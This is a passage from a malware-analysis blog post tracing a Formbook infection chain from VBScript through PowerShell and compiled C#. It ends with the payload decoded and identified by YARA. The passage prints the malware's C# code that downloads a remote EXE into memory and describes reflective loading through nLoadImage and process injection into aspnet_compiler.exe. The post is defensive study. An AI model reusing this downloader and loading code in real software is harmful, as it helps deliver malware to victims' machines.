            <span class="n">WebRequest</span> <span class="n">request</span><span class="p">=</span><span class="n">WebRequest</span><span class="p">.</span><span class="nf">Create</span><span class="p">(</span><span class="n">exe_url</span><span class="p">);</span>
            <span class="n">WebResponse</span> <span class="n">response</span><span class="p">=</span><span class="n">request</span><span class="p">.</span><span class="nf">GetResponse</span><span class="p">();</span>
            <span class="k">using</span><span class="p">(</span><span class="n">Stream</span> <span class="n">web_stream</span><span class="p">=</span><span class="n">response</span><span class="p">.</span><span class="nf">GetResponseStream</span><span class="p">())</span>
            <span class="p">{</span>
                <span class="kt">byte</span><span class="p">[]</span><span class="n">buffer</span><span class="p">=</span><span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">8192</span><span class="p">];</span>
                <span class="kt">int</span> <span class="n">read</span><span class="p">=</span><span class="m">0</span><span class="p">;</span>
                <span class="k">while</span><span class="p">((</span><span class="n">read</span><span class="p">=</span><span class="n">web_stream</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="m">0</span><span class="p">,</span><span class="n">buffer</span><span class="p">.</span><span class="n">Length</span><span class="p">))&gt;</span><span class="m">0</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="n">exe_memory_stream</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="m">0</span><span class="p">,</span><span class="n">read</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="n">response</span><span class="p">.</span><span class="nf">Close</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">ZbkipEZlNxjrowRvPNluqDfkU()</code> function called branches into two additional functions. The first one downloads a Windows EXE file and pushes the contents into a <a href="https://docs.microsoft.com/en-us/dotnet/api/system.io.memorystream?view=net-6.0">MemoryStream</a> object. The second function then takes the MemoryStream and loads its contents using .NET reflection. The method it uses to do reflective loading is slightly unusual. I typically see malware using <code class="language-plaintext highlighter-rouge">[System.Reflection.Assembly]::Load()</code>, <code class="language-plaintext highlighter-rouge">LoadFile()</code>, or <code class="language-plaintext highlighter-rouge">LoadFrom()</code> to load an EXE or DLL into memory. In this case, the malware uses a method called <code class="language-plaintext highlighter-rouge">nLoadImage()</code>. This specific method is part of the Reflection.Assembly or Reflection.RuntimeAssembly classes and is <a href="https://exploitmonday.blogspot.com/2013_11_10_archive.html">usually called by the normal <code class="language-plaintext highlighter-rouge">Load()</code> functions</a>. This malware skips the normal loading method and specifically calls the underlying thing it relies on instead.</p><p>So far we have this execution pattern: <code class="language-plaintext highlighter-rouge">wscript.exe</code> &gt; <code class="language-plaintext highlighter-rouge">powershell.exe</code> &gt; compile C# &gt; execute C# code to download and execute an EXE inside <code class="language-plaintext highlighter-rouge">powershell.exe</code>.</p><p>Getting to the next stage, we can tear into the downloaded EXE, <code class="language-plaintext highlighter-rouge">RYJGJHJDGHR.exe</code>.</p><h2 id="ryjgjhjdghrexe-i-cant-even-spell-it"><span class="mr-2">RYJGJHJDGHR.exe, I can’t even spell it</span><a href="#ryjgjhjdghrexe-i-cant-even-spell-it" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’s figure out what kind of EXE we have using <code class="language-plaintext highlighter-rouge">diec</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/formbook-vbs$</span><span class="w"> </span>diec RYJGJHJDGHR.exe 
<span class="go">PE32
    Protector: Eziriz .NET Reactor(6.x.x.x)[By Dr.FarFar]
    Library: .NET(v4.0.30319)[-]
    Linker: Microsoft Linker(48.0)[GUI32]
</span></pre></table></code></div></div><p>Immediately, Detect-It-Easy tells us we’re dealing with a .NET executable obfuscated with .NET Reactor. This is some kinda-good news because we can easily compile the executable to source even if that source is obfuscated. Since I can’t include the entire source of the executable here, I want to go ahead and share the hash and VT link: <a href="https://www.virustotal.com/gui/file/3b8a5b17925c115df3673e81b408684a6199b9dc6e715810a43444d297c5089d">51c7f45ca2d7d26be5e7d6b51aec8e0a</a>. From here on in, I’ll show portions of the decompiled code as relevant. To obtain the decompiled code, we can use <code class="language-plaintext highlighter-rouge">ilspycmd</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">ilspycmd RYJGJHJDGHR.exe &gt;</span><span class="w"> </span>RYJGJHJDGHR.decompiled.cs
</pre></table></code></div></div><p>The big point to focus on is the <code class="language-plaintext highlighter-rouge">Main()</code> method, which is the entry point for this stage. The function contains an EXE and DLL that have both been encoded into base64 with some characters replaced for basic obfuscation.</p><p><img data-src="/assets/images/formbook-via-vbs-powershell-and-csharp/base64-replacement-obfuscation.png" alt="Base64-encoded Payload" data-proofer-ignore></p><p>After the encoded chunks there is also a chunk of code containing a process path:</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">obj</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[</span><span class="m">4</span><span class="p">]</span>
<span class="p">{</span>
    <span class="s">"ERERRWRWRWSGGSAGDHHJHJBNCBNCBN"</span><span class="p">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s">"ERERRWRWRWSGGSAGDHHJHJBNCBNCBN"</span><span class="p">,</span> <span class="s">"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe"</span><span class="p">),</span>
    <span class="n">empty</span><span class="p">,</span>
    <span class="n">array</span><span class="p">,</span>
    <span class="k">true</span>
<span class="p">};</span>
</pre></table></code></div></div><p>Having the pattern of EXE + DLL + process name is usually a sign of upcoming process injection in the samples I analyze. I assume the DLL will be injection code, the process name is the process a payload will be injected into, and the EXE will be the final payload. By doing find/replace and base64 decoding we got the payload.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/formbook-vbs$</span><span class="w"> </span><span class="nb">head</span> <span class="nt">-c</span> 100 payload.b64 
<span class="go">TVpFUugAAAAAWIPoCYvIg8A8iwADwYPAKAMI/+GQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAuAAAAA4fug4AtAnNIbgB

</span><span class="gp">remnux@remnux:~/cases/formbook-vbs$</span><span class="w"> </span><span class="nb">cat </span>payload.b64 | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> payload.bin
<span class="gp">remnux@remnux:~/cases/formbook-vbs$</span><span class="w"> </span>diec payload.bin 
<span class="go">PE32
    Compiler: MASM(10.00.40219)[-]
    Linker: Microsoft Linker(10.0)[GUI32]
</span></pre></table></code></div></div><p>The extracted EXE is a native Windows binary and not .NET so it’ll take a bit more to tear apart. The good news is that we can identify it as Formbook using YARA, though!</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/formbook-vbs$</span><span class="w"> </span>yara-rules payload.bin 
<span class="go">CRC32b_poly_Constant payload.bin
RIPEMD160_Constants payload.bin
SHA1_Constants payload.bin
maldoc_getEIP_method_1 payload.bin
Formbook payload.bin
IsPE32 payload.bin
IsWindowsGUI payload.bin
IsPacked payload.bin
HasOverlay payload.bin
ImportTableIsBad payload.bin
HasRichSignature payload.bin
Microsoft_Visual_Cpp_v50v60_MFC payload.bin
Borland_Delphi_30_additional payload.bin
Borland_Delphi_30_ payload.bin
Borland_Delphi_v40_v50 payload.bin
Borland_Delphi_v30 payload.bin
Borland_Delphi_DLL payload.bin
</span></pre></table></code></div></div><h2 id="further-work"><span class="mr-2">Further work</span><a href="#further-work" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This is where I want to stop for the night because I’ve achieved my goal of getting the end payload and identifying it. If you want to continue and learn more, I encourage you to try to find the injector code in <code class="language-plaintext highlighter-rouge">RYJGJHJDGHR.exe</code>, decode it, and decompile it to source. If you want to learn more about YARA, try to figure out how YARA knows the <code class="language-plaintext highlighter-rouge">payload.bin</code> binary is Formbook. Thank you for reading!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/malware/'>malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/formbook/" class="post-tag no-text-decoration" >formbook</a> <a href="/tags/vbscript/" class="post-tag no-text-decoration" >vbscript</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >powershell</a> <a href="/tags/csharp/" class="post-tag no-text-decoration" >csharp</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Formbook Distributed Via VBScript, PowerShell, and C# Code - Tony Lambert&amp;url=https://forensicitguy.github.io/formbook-via-vbs-powershell-and-csharp/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Formbook Distributed Via VBScript, PowerShell, and C# Code - Tony Lambert&amp;u=https://forensicitguy.github.io/formbook-via-vbs-powershell-and-csharp/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://forensicitguy.github.io/formbook-via-vbs-powershell-and-csharp/&amp;text=Formbook Distributed Via VBScript, PowerShell, and C# Code - Tony Lambert" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://forensicitguy.github.io/formbook-via-vbs-powershell-and-csharp/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/pecheck-malware-weight-loss/">Bad Guys Hate This Trick for Malware Weight Loss!</a><li><a href="/formbook-via-vbs-powershell-and-csharp/">Formbook Distributed Via VBScript, PowerShell, and C# Code</a><li><a href="/agenttesla-vba-certutil-download/">An AgentTesla Sample Using VBA Macros and Certutil</a><li><a href="/my-sans-dfir-netwars-experience/">My SANS DFIR NetWars Experience</a><li><a href="/making-meterpreter-look-google-signed/">Making Meterpreter Look Google Signed</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/smarter-not-harder-malware-analysis/"><div class="card-body"> <em class="timeago small" data-ts="1630800000" > 2021-09-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Smarter, Not Harder: Getting Malware to Help You Analyze It</h3><div class="text-muted small"><p> When analyzing even non-advanced malware nowadays it’s common to find pretty heavy levels of obfuscation within samples. PowerShell and .NET malware for Windows can be obfuscated easily using vario...</p></div></div></a></div><div class="card"> <a href="/analyzing-log4shell-muhstik/"><div class="card-body"> <em class="timeago small" data-ts="1639267200" > 2021-12-12 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Analyzing a Log4Shell log4j Exploit from Muhstik</h3><div class="text-muted small"><p> In this post I set out to analyze a simple chunk of Log4Shell log4j exploit code to see how it works. Finding the Exploit I wasn’t running a honeypot or anything, I just figured I could rustle ar...</p></div></div></a></div><div class="card"> <a href="/snip3-crypter-dcrat-vbs/"><div class="card-body"> <em class="timeago small" data-ts="1650067200" > 2022-04-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Snip3 Crypter used with DCRat via VBScript</h3><div class="text-muted small"><p> Adversaries love using free or cheap RATs or stealers, and I see a lot of RATs such as AsyncRAT during my daily malware analysis tasks. In this detection I want to examine a fairly recent sample fr...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/aggah-ppam-renamed-mshta/" class="btn btn-outline-primary" prompt="Older"><p>Aggah PPAM macros renaming MSHTA</p></a> <a href="/agenttesla-vba-certutil-download/" class="btn btn-outline-primary" prompt="Newer"><p>An AgentTesla Sample Using VBA Macros and Certutil</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-THRVSJGH6S"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-THRVSJGH6S'); }); </script>
